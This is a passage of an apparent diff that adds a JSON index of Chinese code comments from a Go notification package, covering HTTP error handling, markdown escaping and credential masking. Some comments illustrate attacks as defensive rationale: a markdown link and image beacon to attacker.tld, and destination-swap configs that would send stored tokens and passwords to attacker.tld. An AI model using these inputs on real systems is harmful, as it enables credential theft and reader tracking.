+    "Line": 12,
+    "Text": "// 本文件覆盖 doJSON 的 HTTP 层错误分级。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 162,
+    "End": 263,
+    "Line": 14,
+    "Text": "// 为什么要单独测：各渠道适配器只管平台自己的业务错误码（钉钉 errcode、"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 264,
+    "End": 355,
+    "Line": 15,
+    "Text": "// 飞书 code、Telegram ok 字段），而**HTTP 层**的分级是 doJSON 统一做的，"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 356,
+    "End": 466,
+    "Line": 16,
+    "Text": "// 两者是两道独立的防线。少了这道，一个返回 503 的中转网关会被当成永久失败、"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 467,
+    "End": 550,
+    "Line": 17,
+    "Text": "// 直接放弃重试；而一个 403 会被当成可重试、白白退避三轮。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 2018,
+    "End": 2120,
+    "Line": 64,
+    "Text": "// 状态码必须出现在错误里，否则用户无从判断是自己配错了还是对端挂了。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 2124,
+    "End": 2202,
+    "Line": 65,
+    "Text": "// 断言数字而不是 Go 的英文 StatusText：本包的文案是中文的"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 2206,
+    "End": 2299,
+    "Line": 66,
+    "Text": "// （与项目其它部分一致），数字才是语言无关、可稳定断言的部分。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 2464,
+    "End": 2560,
+    "Line": 74,
+    "Text": "// TestDoJSONIncludesResponseSnippet 覆盖 snippet：对端返回的错误说明要带回来，"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 2561,
+    "End": 2636,
+    "Line": 75,
+    "Text": "// 否则用户只知道「失败了」，不知道对端为什么拒绝。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3002,
+    "End": 3072,
+    "Line": 87,
+    "Text": "// TestDoJSONSnippetIsSingleLineAndBounded 约束 snippet 的形态："
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3073,
+    "End": 3176,
+    "Line": 88,
+    "Text": "// 它对端响应会原样进 last_error 列与前端表格，多行/超长会破坏排版与载荷。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3239,
+    "End": 3302,
+    "Line": 90,
+    "Text": "// 带换行、制表符与 5000 字符超长内容的响应。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3632,
+    "End": 3714,
+    "Line": 101,
+    "Text": "// snippet 上限 200 字符 + 固定前缀，总量必须远小于原始响应。"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3833,
+    "End": 3928,
+    "Line": 107,
+    "Text": "// TestDoJSONRejectsOversizedResponse 确认读取有上限：对端异常返回超大内容时"
+  },
+  {
+    "path": "source/notify/http_test.go",
+    "Start": 3929,
+    "End": 4024,
+    "Line": 108,
+    "Text": "// 不能把整个响应读进内存（投递历史里每一条都会存一份 last_error）。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 46,
+    "End": 136,
+    "Line": 8,
+    "Text": "// 本文件是「Markdown 系」渠道（钉钉、企业微信）共用的消息渲染。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 137,
+    "End": 230,
+    "Line": 9,
+    "Text": "// 飞书用卡片 JSON、Telegram 用 HTML、邮件用 HTML，各自在适配器里渲染。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 232,
+    "End": 331,
+    "Line": 11,
+    "Text": "// maxAssetsShown 是消息里最多列出几个资产。一个漏洞可能锚定几十个资产，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 332,
+    "End": 432,
+    "Line": 12,
+    "Text": "// 全列会挤爆消息且没有信息价值——第 4 个之后的域名没人会在 IM 里看。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 459,
+    "End": 553,
+    "Line": 15,
+    "Text": "// maxSummaryRunes 是摘要被压缩到多少字符。IM 消息是「提示去看详情」，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 554,
+    "End": 605,
+    "Line": 16,
+    "Text": "// 不是报告本体，完整内容在平台里。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 635,
+    "End": 735,
+    "Line": 19,
+    "Text": "// markdownReservedBytes 预留给消息头部（汇总行 + 级别分布 + 可能的截断提示）"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 736,
+    "End": 853,
+    "Line": 20,
+    "Text": "// 与尾部（平台链接）。按整条打包时把这部分从预算里扣掉，保证头尾不会被截掉——"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 854,
+    "End": 953,
+    "Line": 21,
+    "Text": "// 头尾一旦被截，读者连「这是哪一批、还有多少条没显示」都看不出来。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 989,
+    "End": 1035,
+    "Line": 24,
+    "Text": "// markdownEscape 转义 markdown 元字符。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1039,
+    "End": 1148,
+    "Line": 26,
+    "Text": "// 为什么必须做：漏洞标题、摘要、类型、资产展示名全都来自**不可信来源**——"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1149,
+    "End": 1256,
+    "Line": 27,
+    "Text": "// 标题与摘要出自模型输出（模型读的是被测目标的响应），资产的 url 则是扫描"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1257,
+    "End": 1348,
+    "Line": 28,
+    "Text": "// 得到的完整 URL（含目标可控的查询串）。不转义的话，一条标题为"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1352,
+    "End": 1427,
+    "Line": 30,
+    "Text": "//\t登录口 SQL 注入\\n[紧急：点此验证账号](http://attacker.tld)"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1431,
+    "End": 1520,
+    "Line": 32,
+    "Text": "// 的漏洞会在安全工程师的钉钉/飞书里渲染成**可点击的外链**；而"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1521,
+    "End": 1609,
+    "Line": 33,
+    "Text": "// `![](http://attacker.tld/beacon)` 会在渲染时被客户端拉取，等于通报了"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1610,
+    "End": 1718,
+    "Line": 34,
+    "Text": "// 「这条漏洞已经被看过」并泄露阅读者 IP。就算是无恶意的内容，注入的粗体或"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1719,
+    "End": 1779,
+    "Line": 35,
+    "Text": "// 引用块也能把下面的严重漏洞挤出折叠线。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1783,
+    "End": 1890,
+    "Line": 37,
+    "Text": "// 转义集合覆盖标题/链接/强调/列表/引用/删除线这几类会改变结构或产生可点击"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 1891,
+    "End": 1988,
+    "Line": 38,
+    "Text": "// 元素的字符。`\\` 必须最先处理，否则会把后面补上的反斜杠再次转义。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2266,
+    "End": 2352,
+    "Line": 58,
+    "Text": "// markdownText 把不可信文本压成单行并转义，供 markdown 正文使用。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2353,
+    "End": 2452,
+    "Line": 59,
+    "Text": "// 单行化是转义之外的另一半：换行本身就能伪造出新的列表项或引用块，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2453,
+    "End": 2486,
+    "Line": 60,
+    "Text": "// 而转义字符挡不住它。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2586,
+    "End": 2698,
+    "Line": 65,
+    "Text": "// markdownTitle 返回消息标题（IM 平台的标题栏/卡片标题），内容是**未转义的原文**。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2702,
+    "End": 2813,
+    "Line": 67,
+    "Text": "// 这里刻意不做转义：这个标题被四种语境的渲染器共用——markdown 正文、Telegram 的"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2814,
+    "End": 2916,
+    "Line": 68,
+    "Text": "// HTML、飞书卡片的 plain_text、以及通用 Webhook 的 JSON 与邮件主题。每个语境的"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 2917,
+    "End": 3022,
+    "Line": 69,
+    "Text": "// 转义规则都不同（markdown 转义塞进 HTML 会留下可见的反斜杠，塞进 JSON 会污染"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3023,
+    "End": 3119,
+    "Line": 70,
+    "Text": "// 数据），所以转义必须由各自的输出端负责，见 writeItem / feishuItemLines /"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3120,
+    "End": 3214,
+    "Line": 71,
+    "Text": "// telegramEscape。曾经在共享函数里加过 markdown 转义，结果 Telegram 消息里"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3215,
+    "End": 3263,
+    "Line": 72,
+    "Text": "// 出现了 `\\(1\\)` 这种可见的反斜杠。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3548,
+    "End": 3631,
+    "Line": 84,
+    "Text": "// markdownBody 渲染消息正文，返回正文与**实际写入的条目数**。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3635,
+    "End": 3737,
+    "Line": 86,
+    "Text": "// 返回值 kept 是这次投递真正送达的条目数，调用方据此只把前 kept 条标记为"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3738,
+    "End": 3846,
+    "Line": 87,
+    "Text": "// 已送达——被渠道长度上限挡在外面的条目必须留待下一批，而不是跟着一起被"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3847,
+    "End": 3961,
+    "Line": 88,
+    "Text": "// 标记成功。这正是「静默丢失」的来源：消息被截断了，但投递记录显示全部送达，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 3962,
+    "End": 4016,
+    "Line": 89,
+    "Text": "// 没有任何地方能看出后半截从未发出。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 4020,
+    "End": 4053,
+    "Line": 91,
+    "Text": "// maxBytes<=0 表示不限制。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 4237,
+    "End": 4330,
+    "Line": 99,
+    "Text": "// 单条消息即使超长也照发（由最终截断兜底）：一条漏洞的部分信息"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 4333,
+    "End": 4363,
+    "Line": 100,
+    "Text": "// 也好过一条都不发。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5009,
+    "End": 5097,
+    "Line": 124,
+    "Text": "// markdownBatchIntro 渲染汇总消息的开头：时间窗、条数与级别分布。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5098,
+    "End": 5197,
+    "Line": 125,
+    "Text": "// 有了这些，收到汇总的人不用点进平台就能判断这批需不需要立刻处理。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5201,
+    "End": 5301,
+    "Line": 127,
+    "Text": "// items 是**实际装下**的条目，total 是本批应有的总数。两者不同时必须明说"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5302,
+    "End": 5416,
+    "Line": 128,
+    "Text": "// 「还有多少条在下一条消息里」——否则读者会以为消息头写的那个数字就是全部，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5417,
+    "End": 5486,
+    "Line": 129,
+    "Text": "// 而后面那些从未发出的条目在界面上完全不存在。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 5906,
+    "End": 6009,
+    "Line": 140,
+    "Text": "// 按级别给出分布，让读者一眼看到有没有严重项。只统计**本条实际包含**的"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6011,
+    "End": 6082,
+    "Line": 141,
+    "Text": "// 条目，保证「严重 3」和下面能数出来的条目一致。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6484,
+    "End": 6524,
+    "Line": 159,
+    "Text": "// writeItem 渲染单个漏洞条目。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6528,
+    "End": 6625,
+    "Line": 161,
+    "Text": "// prefix 用于汇总列表的序号；single=true 时渲染完整版（含摘要与回链），"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6626,
+    "End": 6717,
+    "Line": 162,
+    "Text": "// 汇总列表里只渲染一行摘要——否则 50 条汇总会变成一篇长文档。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6721,
+    "End": 6806,
+    "Line": 164,
+    "Text": "// 所有来自外部的内容（标题/类型/资产/摘要）都过 markdownText："
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6807,
+    "End": 6914,
+    "Line": 165,
+    "Text": "// 单行化 + 转义。回链是管理员配置的 public_base_url 拼出来的，不是不可信内容，"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 6915,
+    "End": 6969,
+    "Line": 166,
+    "Text": "// 且必须是可点的链接，所以原样输出。"
+  },
+  {
+    "path": "source/notify/markdown.go",
+    "Start": 7164,
+    "End": 7236,
+    "Line": 170,
+    "Text": "// 汇总模式：单行呈现，资产与摘要压缩后跟在后面。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 63,
+    "End": 170,
+    "Line": 9,
+    "Text": "// MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 171,
+    "End": 255,
+    "Line": 10,
+    "Text": "// 更新接口收到带此前缀的值即理解为「保持库中原值不变」。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 259,
+    "End": 355,
+    "Line": 12,
+    "Text": "// 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 356,
+    "End": 461,
+    "Line": 13,
+    "Text": "// （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 497,
+    "End": 536,
+    "Line": 16,
+    "Text": "// MaskedValue 生成一个掩码值："
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 540,
+    "End": 602,
+    "Line": 18,
+    "Text": "//\t\"__masked__\"              原值太短，不给任何提示"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 603,
+    "End": 673,
+    "Line": 19,
+    "Text": "//\t\"__masked__:…ab12cd\"      带上原值末 6 位作为辨识提示"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 677,
+    "End": 785,
+    "Line": 21,
+    "Text": "// 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 786,
+    "End": 891,
+    "Line": 22,
+    "Text": "// 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 892,
+    "End": 961,
+    "Line": 23,
+    "Text": "// 还原凭据，但足以让配置者认出「是我那个群」。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1109,
+    "End": 1193,
+    "Line": 31,
+    "Text": "// IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1270,
+    "End": 1356,
+    "Line": 34,
+    "Text": "// MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1360,
+    "End": 1462,
+    "Line": 36,
+    "Text": "// 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1463,
+    "End": 1556,
+    "Line": 37,
+    "Text": "// 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1557,
+    "End": 1614,
+    "Line": 38,
+    "Text": "// 非凭据字段原样保留，UI 才能正常展示。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 1956,
+    "End": 2051,
+    "Line": 54,
+    "Text": "// headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 2054,
+    "End": 2135,
+    "Line": 55,
+    "Text": "// 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 2252,
+    "End": 2346,
+    "Line": 65,
+    "Text": "// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 2347,
+    "End": 2460,
+    "Line": 66,
+    "Text": "// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3062,
+    "End": 3166,
+    "Line": 78,
+    "Text": "// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3170,
+    "End": 3279,
+    "Line": 80,
+    "Text": "// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径："
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3280,
+    "End": 3388,
+    "Line": 81,
+    "Text": "// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3389,
+    "End": 3500,
+    "Line": 82,
+    "Text": "// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3501,
+    "End": 3599,
+    "Line": 83,
+    "Text": "// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点："
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3603,
+    "End": 3697,
+    "Line": 85,
+    "Text": "//\twebhook  {config:{url:\"https://attacker.tld\"}}  → 原始 Authorization 头随请求外发"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3698,
+    "End": 3783,
+    "Line": 86,
+    "Text": "//\ttelegram {config:{base_url:\"https://attacker.tld\"}} → /bot<真Token>/sendMessage"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3784,
+    "End": 3875,
+    "Line": 87,
+    "Text": "//\temail    {config:{host:\"smtp.attacker.tld\"}}    → STARTTLS 后交出用户名与密码"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3879,
+    "End": 3975,
+    "Line": 89,
+    "Text": "// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 3976,
+    "End": 4069,
+    "Line": 90,
+    "Text": "// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4073,
+    "End": 4185,
+    "Line": 92,
+    "Text": "// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态："
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4186,
+    "End": 4219,
+    "Line": 93,
+    "Text": "//   - 给出新值 → 用新值"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4220,
+    "End": 4298,
+    "Line": 94,
+    "Text": "//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4299,
+    "End": 4362,
+    "Line": 95,
+    "Text": "//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4366,
+    "End": 4474,
+    "Line": 97,
+    "Text": "// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4475,
+    "End": 4574,
+    "Line": 98,
+    "Text": "// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4575,
+    "End": 4679,
+    "Line": 99,
+    "Text": "// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 4680,
+    "End": 4740,
+    "Line": 100,
+    "Text": "// 比报错更难排查。宁可让操作者多填一次。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5023,
+    "End": 5122,
+    "Line": 109,
+    "Text": "// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5124,
+    "End": 5229,
+    "Line": 110,
+    "Text": "// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5231,
+    "End": 5342,
+    "Line": 111,
+    "Text": "// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5344,
+    "End": 5425,
+    "Line": 112,
+    "Text": "// \"__masked__\"，后续鉴权静默失效且没有任何报错。宁可拒掉。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5431,
+    "End": 5531,
+    "Line": 114,
+    "Text": "// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5533,
+    "End": 5641,
+    "Line": 115,
+    "Text": "// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 5734,
+    "End": 5806,
+    "Line": 120,
+    "Text": "// 找出真正被改掉的目的地键。掩码值等于「没改」。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 6109,
+    "End": 6202,
+    "Line": 136,
+    "Text": "// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 6252,
+    "End": 6309,
+    "Line": 140,
+    "Text": "// 地址变了：要求对每个凭据键显式表态。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 6719,
+    "End": 6804,
+    "Line": 158,
+    "Text": "// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 6808,
+    "End": 6916,
+    "Line": 160,
+    "Text": "// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 6917,
+    "End": 7017,
+    "Line": 161,
+    "Text": "// 只能整体掩码（写成字符串 \"__masked__\"）或整体提交；把哨兵塞进对象内部"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 7018,
+    "End": 7093,
+    "Line": 162,
+    "Text": "// 既表达不了「保持不变」，又会被当成真实值存进库。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 7684,
+    "End": 7784,
+    "Line": 184,
+    "Text": "// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 7785,
+    "End": 7897,
+    "Line": 185,
+    "Text": "// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 7901,
+    "End": 8015,
+    "Line": 187,
+    "Text": "// 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8016,
+    "End": 8118,
+    "Line": 188,
+    "Text": "// 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8119,
+    "End": 8222,
+    "Line": 189,
+    "Text": "// 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8223,
+    "End": 8268,
+    "Line": 190,
+    "Text": "// 官方地址）会走成这条路径——"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8272,
+    "End": 8346,
+    "Line": 192,
+    "Text": "//\t新建时存下 base_url:\"\"  →  第一次保存被 MergeConfig 删键"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8347,
+    "End": 8434,
+    "Line": 193,
+    "Text": "//\t→ 第二次保存时 incoming 是 \"\"、stored 缺键，被判成「地址变了」"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8435,
+    "End": 8531,
+    "Line": 194,
+    "Text": "//\t→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8535,
+    "End": 8635,
+    "Line": 196,
+    "Text": "// 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8889,
+    "End": 8953,
+    "Line": 209,
+    "Text": "// isBlankConfigValue 判定一个配置值是否为「空」。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 8954,
+    "End": 9041,
+    "Line": 210,
+    "Text": "// 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == \"\"），"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9042,
+    "End": 9133,
+    "Line": 211,
+    "Text": "// 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9269,
+    "End": 9350,
+    "Line": 220,
+    "Text": "// MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9354,
+    "End": 9366,
+    "Line": 222,
+    "Text": "// 规则："
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9367,
+    "End": 9462,
+    "Line": 223,
+    "Text": "//   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9463,
+    "End": 9538,
+    "Line": 224,
+    "Text": "//   - incoming 里值为空串的键 → 视为显式清空，删除该键"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9539,
+    "End": 9585,
+    "Line": 225,
+    "Text": "//   - 其余键 → 用 incoming 的值覆盖"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9586,
+    "End": 9669,
+    "Line": 226,
+    "Text": "//   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9673,
+    "End": 9766,
+    "Line": 228,
+    "Text": "// 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9767,
+    "End": 9860,
+    "Line": 229,
+    "Text": "// 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9861,
+    "End": 9963,
+    "Line": 230,
+    "Text": "// 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式"
+  },
+  {
+    "path": "source/notify/mask.go",
+    "Start": 9964,
+    "End": 10064,
+    "Line": 231,
+    "Text": "// （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 442,
+    "End": 505,
+    "Line": 18,
+    "Text": "// 末 6 位要保留，用户才能认出是哪个机器人。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 757,
+    "End": 832,
+    "Line": 28,
+    "Text": "// 短凭据如果也暴露末 6 位，等于把整个凭据暴露出去。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 1551,
+    "End": 1615,
+    "Line": 54,
+    "Text": "// 非凭据字段必须原样保留，否则 UI 无法展示。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 1787,
+    "End": 1905,
+    "Line": 61,
+    "Text": "// 渠道类型无法识别时，宁可让 UI 显示空配置，也不要把可能含凭据的原始内容吐回去。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 2135,
+    "End": 2207,
+    "Line": 69,
+    "Text": "// 掩码是展示层行为，不能反过来把库里的真值改掉。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 2624,
+    "End": 2696,
+    "Line": 79,
+    "Text": "// 用户只改了 method，浏览器提交的是掩码值+新 method。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 3410,
+    "End": 3464,
+    "Line": 100,
+    "Text": "// 没提到的字段保留（局部更新语义）。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 4033,
+    "End": 4126,
+    "Line": 117,
+    "Text": "// TestPrepareConfigUpdateBlocksDestinationSwap 是本包最重要的一条安全不变量："
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 4127,
+    "End": 4179,
+    "Line": 118,
+    "Text": "// **改目标地址不能把旧凭据带过去**。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 4183,
+    "End": 4276,
+    "Line": 120,
+    "Text": "// 这些用例用的正是攻击形状的输入（只改地址、对凭据避而不谈），"
+  },
+  {
